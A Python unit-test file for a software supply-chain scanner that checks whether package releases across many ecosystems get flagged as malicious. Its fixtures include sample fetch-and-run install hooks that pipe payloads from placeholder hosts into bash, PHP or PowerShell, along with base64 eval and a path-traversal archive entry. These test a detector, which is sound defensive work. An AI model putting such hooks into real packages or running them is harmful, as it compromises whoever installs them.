import os
import json
import shutil
import sys
import tarfile
import tempfile
import unittest
import zipfile
from datetime import datetime, timezone
from io import StringIO
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from secopsai import supply_chain
from secopsai import cli as secopsai_cli


def datetime_from_epoch(epoch: float) -> str:
    return datetime.fromtimestamp(epoch, tz=timezone.utc).isoformat().replace("+00:00", "Z")


class SupplyChainTests(unittest.TestCase):
    def _zip_fixture(self, path: Path, files: dict[str, str]) -> Path:
        with zipfile.ZipFile(path, "w") as zf:
            for name, text in files.items():
                zf.writestr(name, text)
        return path

    def _targz_fixture(self, path: Path, files: dict[str, str]) -> Path:
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            for name, text in files.items():
                target = root / name
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text(text, encoding="utf-8")
            with tarfile.open(path, "w:gz") as tf:
                for item in root.rglob("*"):
                    tf.add(item, arcname=str(item.relative_to(root)))
        return path

    def test_allowlist_add_and_remove_updates_policy(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )

            added = supply_chain.allowlist_add("pypi", "textual", path=policy_path)
            removed = supply_chain.allowlist_remove("pypi", "textual", path=policy_path)
            policy = supply_chain.load_policy(policy_path)

        self.assertTrue(added["changed"])
        self.assertTrue(removed["changed"])
        self.assertEqual(policy["allow"]["packages"], [])

    def test_tune_rule_and_threshold_update_policy(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )

            supply_chain.tune_rule("manifest executable entrypoints", enabled=False, weight=1, path=policy_path)
            supply_chain.tune_threshold(ecosystem="pypi", value=12, path=policy_path)
            supply_chain.tune_threshold(ecosystem="pypi", package="langchain", value=14, path=policy_path)
            policy = supply_chain.load_policy(policy_path)

        self.assertEqual(policy["rules"]["manifest executable entrypoints"], False)
        self.assertEqual(policy["rule_weights"]["manifest executable entrypoints"], 1)
        self.assertEqual(policy["ecosystem_thresholds"]["pypi"], 12)
        self.assertEqual(policy["package_thresholds"]["pypi:langchain"], 14)

    def test_cli_allowlist_add_and_tune_rule(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )
            old_env = os.environ.get("SECOPS_SUPPLY_CHAIN_POLICY")
            os.environ["SECOPS_SUPPLY_CHAIN_POLICY"] = str(policy_path)
            stdout = StringIO()
            try:
                with mock.patch("sys.stdout", stdout):
                    rc_add = secopsai_cli.main(
                        ["--json", "supply-chain", "allowlist", "add", "--ecosystem", "pypi", "--package", "textual"]
                    )
                add_output = stdout.getvalue()
                stdout.seek(0)
                stdout.truncate(0)
                with mock.patch("sys.stdout", stdout):
                    rc_tune = secopsai_cli.main(
                        ["--json", "supply-chain", "tune", "rule", "manifest executable entrypoints", "--disable", "--weight", "1"]
                    )
                tune_output = stdout.getvalue()
            finally:
                if old_env is None:
                    os.environ.pop("SECOPS_SUPPLY_CHAIN_POLICY", None)
                else:
                    os.environ["SECOPS_SUPPLY_CHAIN_POLICY"] = old_env

        self.assertEqual(rc_add, 0)
        self.assertEqual(rc_tune, 0)
        self.assertIn('"entry": "pypi:textual"', add_output)
        self.assertIn('"rule": "manifest executable entrypoints"', tune_output)

    def test_build_finding_uses_stable_identifier(self):
        result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious suspicious code path",
            report_path="/tmp/report.md",
            rank=12,
            finding_id=supply_chain._finding_id("pypi", "requests", "2.32.0"),
        )
        finding = supply_chain._build_finding(result)
        self.assertEqual(finding["finding_id"], result.finding_id)
        self.assertEqual(finding["severity"], "critical")
        self.assertIn("requests@2.32.0", finding["title"])

    def test_load_recent_results_returns_most_recent_first(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            original = supply_chain.RESULTS_PATH
            supply_chain.RESULTS_PATH = Path(temp_dir) / "results.jsonl"
            try:
                first = supply_chain.ScanResult("pypi", "a", "1.0.0", "1.1.0", "benign", "", None, None, None)
                second = supply_chain.ScanResult("npm", "b", "2.0.0", "2.1.0", "malicious", "", None, None, "SCM-1")
                supply_chain._append_results([first, second])
                rows = supply_chain.load_recent_results(limit=2)
            finally:
                supply_chain.RESULTS_PATH = original

        self.assertEqual(rows[0]["package"], "b")
        self.assertEqual(rows[1]["package"], "a")

    def test_reconcile_history_cleans_stale_false_positive_state(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            original_results = supply_chain.RESULTS_PATH
            original_slack_state = supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH
            original_db_env = os.environ.get("SECOPS_FINDINGS_DIR")
            supply_chain.RESULTS_PATH = temp_path / "results.jsonl"
            supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = temp_path / "supply_chain_slack_state.json"
            os.environ["SECOPS_FINDINGS_DIR"] = str(temp_path / "findings")
            try:
                report_path = temp_path / "report.md"
                report_path.write_text("No strong compromise indicators found.\n", encoding="utf-8")
                row = {
                    "analysis": "Deterministic rules flagged: obfuscated eval",
                    "ecosystem": "npm",
                    "error": None,
                    "finding_id": "SCM-FP1",
                    "new_version": "1.2.3",
                    "old_version": "1.2.2",
                    "package": "example-clean",
                    "rank": 10,
                    "recorded_at": "2026-04-03T00:00:00Z",
                    "report_path": str(report_path),
                    "verdict": "malicious",
                }
                supply_chain._save_all_results([row])
                supply_chain.save_slack_state({"finding_ids": ["SCM-FP1"]}, supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
                db_path = supply_chain.soc_store.default_db_path()
                supply_chain._upsert_findings([
                    {
                        "finding_id": "SCM-FP1",
                        "title": "Suspicious npm package release: example-clean@1.2.3",
                        "summary": "false positive",
                        "severity": "critical",
                        "severity_score": 90,
                        "status": "open",
                        "disposition": "unreviewed",
                        "first_seen": "2026-04-03T00:00:00Z",
                        "last_seen": "2026-04-03T00:00:00Z",
                        "event_ids": [],
                    }
                ])

                payload = supply_chain.reconcile_history()
                rows = supply_chain._load_all_results()
                state = supply_chain.load_slack_state(supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
                finding = supply_chain.soc_store.get_finding("SCM-FP1", db_path)
            finally:
                supply_chain.RESULTS_PATH = original_results
                supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = original_slack_state
                if original_db_env is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = original_db_env

        self.assertEqual(payload["reclassified"], 1)
        self.assertEqual(rows[0]["verdict"], "benign")
        self.assertEqual(state["finding_ids"], [])
        self.assertIsNone(finding)

    def test_run_scan_can_emit_slack_alert(self):
        fake_result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious",
            report_path="/tmp/report.md",
            rank=10,
            finding_id="SCM-TEST",
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result), \
             mock.patch.object(supply_chain, "_append_results"), \
             mock.patch.object(supply_chain, "_upsert_findings", return_value="/tmp/test.db"), \
             mock.patch.object(supply_chain, "alert_new_supply_chain_findings", return_value={"new_findings": 1, "sent": True}) as alert_mock:
            payload = supply_chain.run_scan(
                ecosystem="pypi",
                package="requests",
                version="2.32.0",
                slack=True,
            )

        self.assertEqual(payload["slack_alerts_sent"], 1)
        alert_mock.assert_called_once()

    def test_classifier_flags_suspicious_npm_install_hook(self):
        report = """
## Artifact: npm-tarball

### `package.json`

```diff
+  "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
```
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("install hook", analysis)

    def test_classifier_flags_pypi_artifact_divergence(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=0
- suspicious_wheel_only_files:
  - `package/backdoor.py`
  - `package/native_payload.so`
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("artifact", analysis)

    def test_semantic_python_findings_detect_exec_and_network(self):
        source = """
import urllib.request
exec("print('x')")
urllib.request.urlopen("https://evil.example/payload")
"""
        findings = supply_chain._python_semantic_findings("payload.py", source)
        self.assertTrue(any("dynamic execution" in finding for finding in findings))
        self.assertTrue(any("outbound URL literal" in finding for finding in findings))

    def test_classifier_flags_semantic_findings_section(self):
        report = """
## Semantic Findings

- payload.py: python dynamic execution via exec()
- payload.py: python outbound URL literal https://evil.example/payload
- payload.py: python subprocess-capable call via subprocess.run()
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("semantic", analysis)

    def test_package_json_policy_findings_detect_lifecycle_and_remote_dep(self):
        source = """
{
  "scripts": {
    "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
  },
  "dependencies": {
    "left-pad": "https://evil.example/left-pad.tgz"
  },
  "bin": {
    "runner": "bin/runner.js"
  }
}
"""
        findings = supply_chain._package_json_policy_findings("package.json", source)
        self.assertTrue(any("lifecycle hook" in finding for finding in findings))
        self.assertTrue(any("non-registry source" in finding for finding in findings))
        self.assertTrue(any("bin" in finding for finding in findings))

    def test_setup_py_policy_findings_detect_cmdclass_and_exec(self):
        source = """
from setuptools import setup
import subprocess

setup(
    name="evilpkg",
    cmdclass={"install": object},
    entry_points={"console_scripts": ["evil=evil:main"]},
)

subprocess.run(["curl", "https://evil.example"])
"""
        findings = supply_chain._setup_py_policy_findings("setup.py", source)
        self.assertTrue(any("cmdclass" in finding for finding in findings))
        self.assertTrue(any("entrypoints" in finding or "entrypoints" in finding for finding in findings))
        self.assertTrue(any("execution or network-capable" in finding for finding in findings))

    def test_pyproject_policy_findings_detect_scripts_and_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "custom.backend"

[project]
dependencies = ["evilpkg @ https://evil.example/evilpkg.whl"]
scripts = { evil = "evil:main" }
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertTrue(any("console scripts" in finding for finding in findings))
        self.assertTrue(any("direct URL" in finding for finding in findings))
        self.assertTrue(any("custom build backend" in finding for finding in findings))

    def test_pyproject_policy_ignores_common_build_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "normalpkg"
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertFalse(any("custom build backend" in finding for finding in findings))

    def test_classifier_flags_manifest_policy_findings(self):
        report = """
## Semantic Findings

- package.json: npm lifecycle hook runs remote or inline code (postinstall)
- package.json: npm dependency uses non-registry source (left-pad)
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("manifest", analysis)

    def test_classifier_does_not_flag_outbound_url_alone(self):
        verdict, analysis = supply_chain._classify_report_text(
            """
```diff
+ https://docs.example/reference
```
"""
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("No strong compromise indicators", analysis)

    def test_classifier_does_not_flag_console_scripts_alone(self):
        report = """
## Semantic Findings

- pyproject.toml: pyproject declares console scripts
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_classifier_does_not_flag_unsuspicious_artifact_divergence_alone(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=1
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_changed_file_semantic_scan_uses_added_lines_only(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            old_path = Path(temp_dir) / "old.py"
            new_path = Path(temp_dir) / "new.py"
            old_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 1\n",
                encoding="utf-8",
            )
            new_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 2\n",
                encoding="utf-8",
            )
            findings = supply_chain._semantic_findings_for_changed_file("module.py", old_path, new_path)
        self.assertEqual(findings, [])

    def test_artifact_divergence_ignores_src_layout_and_docs(self):
        artifact_reports = {
            "bdist_wheel": {
                "files_new": {
                    "pkg/__init__.py": Path("/tmp/pkg/__init__.py"),
                    "pkg/core.py": Path("/tmp/pkg/core.py"),
                }
            },
            "sdist": {
                "files_new": {
                    "src/pkg/__init__.py": Path("/tmp/src/pkg/__init__.py"),
                    "src/pkg/core.py": Path("/tmp/src/pkg/core.py"),
                    "docs/example.py": Path("/tmp/docs/example.py"),
                    "tests/test_pkg.py": Path("/tmp/tests/test_pkg.py"),
                }
            },
        }
        lines = supply_chain._summarize_artifact_mismatch(artifact_reports)
        self.assertEqual(lines, [])

    def test_policy_denylist_forces_malicious(self):
        policy = {
            "thresholds": {"malicious_score": 99},
            "allow": {"packages": []},
            "deny": {"packages": ["pypi:requests"]},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "No strong signals",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")
        self.assertIn("denylist", analysis)

    def test_policy_allowlist_forces_benign(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "https://evil.example eval exec",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("allowlist", analysis)

    def test_policy_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_package_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:sample": 1},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_rule_toggle_disables_signal(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": False},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_ecosystem_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {"pypi": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_rule_weight_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": True},
            "rule_weights": {"obfuscated eval": 5},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_explain_policy_reports_exact_package_threshold(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"pypi": 7},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:requests": 9},
            "rules": {"obfuscated eval": False},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_policy("pypi", "requests", policy=policy)
        self.assertEqual(payload["effective_threshold"], 9)
        self.assertEqual(payload["precedence"], ["package_threshold"])
        self.assertEqual(payload["matched_package_threshold"]["entry"], "pypi:requests")
        self.assertIn("obfuscated eval", payload["disabled_rules"])
        self.assertEqual(payload["rule_weight_overrides"]["obfuscated eval"], 5)

    def test_explain_policy_reports_wildcard_threshold_and_allowlist(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"npm": 8},
            "allow": {"packages": ["npm:@your-org/*"]},
            "deny": {"packages": []},
            "package_thresholds": {"npm:@your-org/*": 10},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_policy("npm", "@your-org/pkg", policy=policy)
        self.assertEqual(payload["effective_threshold"], 10)
        self.assertIn("npm:@your-org/*", payload["allow_matches"])
        self.assertEqual(payload["precedence"], ["allowlist"])

    def test_explain_verdict_reports_matched_rules_and_weights(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_verdict(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["score"], 5)
        self.assertEqual(payload["matched_rules"][0]["rule"], "obfuscated eval")
        self.assertEqual(payload["matched_rules"][0]["weight"], 5)

    def test_explain_verdict_reports_allowlist_context(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_verdict(
            "https://evil.example eval",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "benign")
        self.assertIn("allowlist", payload["analysis"])
        self.assertEqual(payload["allow_matches"], ["pypi:requests"])
        self.assertEqual(payload["policy"]["precedence"], ["allowlist"])

    def test_advisory_exact_version_match(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-1",
                "campaign_id": "unit-campaign",
                "title": "Unit advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/pkg", "versions": ["1.2.3"]}],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                payload = supply_chain.check_advisory("npm", "@scope/pkg", "1.2.3")

        self.assertTrue(payload["matched"])
        self.assertEqual(payload["matches"][0]["advisory_id"], "ADV-1")

    def test_advisory_exact_match_for_supported_ecosystems(self):
        affected = [
            {"ecosystem": "crates", "package": "secopsai-fixture-crate", "versions": ["1.2.3"]},
            {"ecosystem": "chrome-web-store", "package": "fixtureextensionid", "versions": ["4.5.6"]},
            {"ecosystem": "packagist", "package": "vendor/fixture", "versions": ["1.0.0"]},
            {"ecosystem": "go", "package": "github.com/example/fixture", "versions": ["v1.2.3"]},
            {"ecosystem": "huggingface", "package": "secopsai/fixture-model", "versions": ["main"]},
            {"ecosystem": "maven", "package": "com.example:fixture", "versions": ["2.0.0"]},
            {"ecosystem": "nuget", "package": "fixture.package", "versions": ["3.0.0"]},
            {"ecosystem": "open-vsx", "package": "secopsai.fixture", "versions": ["0.1.0"]},
            {"ecosystem": "rubygems", "package": "fixture_gem", "versions": ["9.9.9"]},
            {"ecosystem": "pypi", "package": "fixture-pypi", "versions": ["7.0.0"]},
            {"ecosystem": "npm", "package": "@fixture/pkg", "versions": ["8.0.0"]},
        ]
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "multi.json").write_text(json.dumps({
                "advisory_id": "ADV-MULTI",
                "title": "Multi ecosystem fixture advisory",
                "status": "active",
                "affected": affected,
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                for item in affected:
                    package_query = (
                        item["package"]
                        if item["ecosystem"] in {"go", "huggingface"}
                        else item["package"].upper()
                    )
                    payload = supply_chain.check_advisory(item["ecosystem"], package_query, item["versions"][0])
                    self.assertTrue(payload["matched"], item)
                    miss = supply_chain.check_advisory(item["ecosystem"], item["package"], "0.0.1")
                    self.assertFalse(miss["matched"], item)

    def test_supported_ecosystems_expose_capabilities(self):
        payload = supply_chain.list_supported_ecosystems()
        names = {item["ecosystem"] for item in payload["ecosystems"]}
        for ecosystem in {
            "crates",
            "chrome-web-store",
            "packagist",
            "go",
            "huggingface",
            "maven",
            "nuget",
            "open-vsx",
            "pypi",
            "rubygems",
            "npm",
        }:
            self.assertIn(ecosystem, names)
        self.assertTrue(supply_chain.validate_package_identifier("maven", "com.example:fixture")["valid"])
        self.assertFalse(supply_chain.validate_package_identifier("maven", "fixture")["valid"])

    def test_live_adapter_version_rows_for_new_ecosystems(self):
        fixtures = {
            "crates": ({"versions": [{"num": "1.0.0", "created_at": "2026-01-01T00:00:00Z"}]}, "fixture", "1.0.0"),
            "packagist": ({"packages": {"vendor/fixture": [{"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/fixture.zip"}}]}}, "vendor/fixture", "1.0.0"),
            "go": ({"versions": [{"version": "v1.0.0", "published_at": "2026-01-01T00:00:00Z"}]}, "github.com/example/fixture", "v1.0.0"),
            "huggingface": ({"sha": "main", "lastModified": "2026-01-01T00:00:00Z", "siblings": [{"rfilename": "config.json"}]}, "secopsai/fixture-model", "main"),
            "maven": ({"versions": [{"version": "1.0.0", "published_at": None}]}, "com.example:fixture", "1.0.0"),
            "nuget": ({"versions": ["1.0.0"]}, "Fixture.Package", "1.0.0"),
            "open-vsx": ({"versions": [{"version": "1.0.0", "timestamp": "2026-01-01T00:00:00Z", "files": {"download": "https://example.test/fixture.vsix"}}]}, "secopsai.fixture", "1.0.0"),
            "rubygems": ([{"number": "1.0.0", "built_at": "2026-01-01T00:00:00Z"}], "fixture_gem", "1.0.0"),
        }
        for ecosystem, (metadata, package, version) in fixtures.items():
            rows = supply_chain._version_rows_from_metadata(ecosystem, supply_chain.normalize_package_name(ecosystem, package), metadata)
            self.assertTrue(any(row["version"] == version for row in rows), ecosystem)
            self.assertTrue(any(row.get("artifact_url") for row in rows), ecosystem)

    def test_local_chrome_artifact_scan_uses_deterministic_rules(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            archive = self._zip_fixture(
                Path(temp_dir) / "extension.zip",
                {
                    "manifest.json": json.dumps({"permissions": ["cookies"], "host_permissions": ["<all_urls>"]}),
                    "worker.js": "eval(fetch('https://e.example/payload'))",
                },
            )
            payload = supply_chain.run_scan(
                ecosystem="chrome-web-store",
                package="fixtureextensionid",
                version="1.0.0",
                artifact=archive,
                keep_report=False,
            )
        self.assertIn(payload["result"]["verdict"], {"malicious", "benign"})
        self.assertIn("local-artifact", payload["result"]["metadata"]["artifact_status"])

    def test_safe_zip_extraction_blocks_traversal(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            archive = Path(temp_dir) / "evil.zip"
            with zipfile.ZipFile(archive, "w") as zf:
                zf.writestr("../evil.txt", "nope")
            with self.assertRaises(RuntimeError):
                supply_chain._extract_archive(archive, Path(temp_dir) / "out")

    def test_packagist_live_scan_with_mocked_registry_and_archive(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            old_archive = self._zip_fixture(root / "old.zip", {"composer.json": json.dumps({"name": "vendor/fixture"})})
            new_archive = self._zip_fixture(root / "new.zip", {
                "composer.json": json.dumps({"name": "vendor/fixture", "scripts": {"post-install-cmd": "curl https://e.example | php"}}),
                "src/Hook.php": "<?php eval(base64_decode($x));",
            })
            metadata = {
                "packages": {
                    "vendor/fixture": [
                        {"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/old.zip"}},
                        {"version": "1.0.1", "time": "2026-01-02T00:00:00Z", "dist": {"url": "https://example.test/new.zip"}},
                    ]
                }
            }

            def fake_download(url, dest, **_kwargs):
                source = new_archive if url.endswith("new.zip") else old_archive
                dest.parent.mkdir(parents=True, exist_ok=True)
                shutil.copyfile(source, dest)
                return dest

            with mock.patch.object(supply_chain, "_fetch_ecosystem_metadata", return_value=metadata), \
                 mock.patch.object(supply_chain, "_download_file", side_effect=fake_download), \
                 mock.patch.object(supply_chain, "_append_results"), \
                 mock.patch.object(supply_chain, "_upsert_findings"):
                payload = supply_chain.run_scan(
                    ecosystem="packagist",
                    package="vendor/fixture",
                    version="1.0.1",
                    keep_report=False,
                )
        self.assertEqual(payload["result"]["old_version"], "1.0.0")
        self.assertIn(payload["result"]["verdict"], {"malicious", "benign"})
        self.assertEqual(payload["result"]["metadata"]["artifact_status"], "downloaded")

    def test_ecosystem_rules_detect_first_pass_risks(self):
        cases = {
            "crates": {
                "build.rs": 'use std::process::Command; fn main(){ Command::new("curl").arg("https://e.example").status().unwrap(); }',
            },
            "chrome-web-store": {
                "manifest.json": json.dumps({"permissions": ["tabs", "cookies"], "host_permissions": ["<all_urls>"]}),
            },
            "packagist": {
                "composer.json": json.dumps({"scripts": {"post-install-cmd": "curl https://e.example | php"}}),
                "src/Hook.php": "<?php eval(base64_decode($x));",
            },
            "go": {
                "main.go": 'package main\nimport "os/exec"\nfunc init(){ exec.Command("sh","-c","curl https://e.example").Run() }',
            },
            "huggingface": {
                "config.json": json.dumps({"trust_remote_code": True}),
                "model.bin": "binary fixture",
            },
            "maven": {
                "pom.xml": "<project><build><plugins><plugin><artifactId>exec-maven-plugin</artifactId></plugin></plugins></build></project>",
                "src/Main.java": "Runtime.getRuntime().exec(\"curl https://e.example\");",
            },
            "nuget": {
                "tools/install.ps1": "Invoke-WebRequest https://e.example/p.ps1 | powershell",
            },
            "open-vsx": {
                "package.json": json.dumps({"activationEvents": ["*"], "scripts": {"postinstall": "node setup.js"}}),
                "extension.js": "const cp = require('child_process'); cp.exec('env');",
            },
            "rubygems": {
                "extconf.rb": "require 'open3'; system('curl https://e.example')",
            },
        }
        for ecosystem, files in cases.items():
            payload = supply_chain.analyze_ecosystem_files(ecosystem, files)
            self.assertTrue(payload["findings"], ecosystem)
            self.assertIn(payload["ecosystem"], supply_chain.SUPPORTED_ECOSYSTEM_NAMES)

    def test_explain_verdict_includes_ecosystem_manifest_evidence(self):
        report = """
## Ecosystem Findings

- build.rs: crates build.rs install-time execution risk
- build.rs: crates build.rs environment credential access
"""
        payload = supply_chain.explain_verdict(
            report,
            ecosystem="crates",
            package="secopsai-fixture-crate",
            version="1.2.3",
        )
        rules = {rule["rule"] for rule in payload["matched_rules"]}
        self.assertIn("ecosystem manifest risk", rules)

    def test_chrome_web_store_scan_requires_local_artifact_without_advisory(self):
        payload = supply_chain.run_scan(
            ecosystem="chrome-web-store",
            package="fixtureextensionid",
            version="1.2.3",
            keep_report=False,
        )
        self.assertEqual(payload["result"]["verdict"], "skipped")
        self.assertIn("live registry fetch unsupported", payload["result"]["error"])

    def test_soc_finding_serializes_non_npm_ecosystem(self):
        result = supply_chain.ScanResult(
            ecosystem="maven",
            package="com.example:fixture",
            old_version="1.0.0",
            new_version="1.0.1",
            verdict="malicious",
            analysis="Deterministic rules flagged: ecosystem manifest risk",
            report_path="/tmp/report.md",
            rank=None,
            finding_id=supply_chain._finding_id("maven", "com.example:fixture", "1.0.1"),
        )
        finding = supply_chain._build_finding(result)
        self.assertEqual(finding["ecosystem"], "maven")
        self.assertEqual(finding["package"], "com.example:fixture")
        self.assertIn("com.example:fixture@1.0.1", finding["title"])

    def test_advisory_version_range_match(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-RANGE",
                "title": "Range advisory",
                "status": "active",
                "affected": [{
                    "ecosystem": "pypi",
                    "package": "sample",
                    "version_ranges": [{"introduced": "2.0.0", "fixed": "2.0.5"}],
                }],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                matched = supply_chain.check_advisory("pypi", "sample", "2.0.3")
                not_matched = supply_chain.check_advisory("pypi", "sample", "2.0.5")

        self.assertTrue(matched["matched"])
        self.assertFalse(not_matched["matched"])

    def test_advisory_index_refreshes_when_files_change(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            advisory_path = advisory_dir / "test.json"
            advisory_path.write_text(json.dumps({
                "advisory_id": "ADV-CACHE",
                "title": "Cached advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "cached-pkg", "versions": ["1.0.0"]}],
            }), encoding="utf-8")
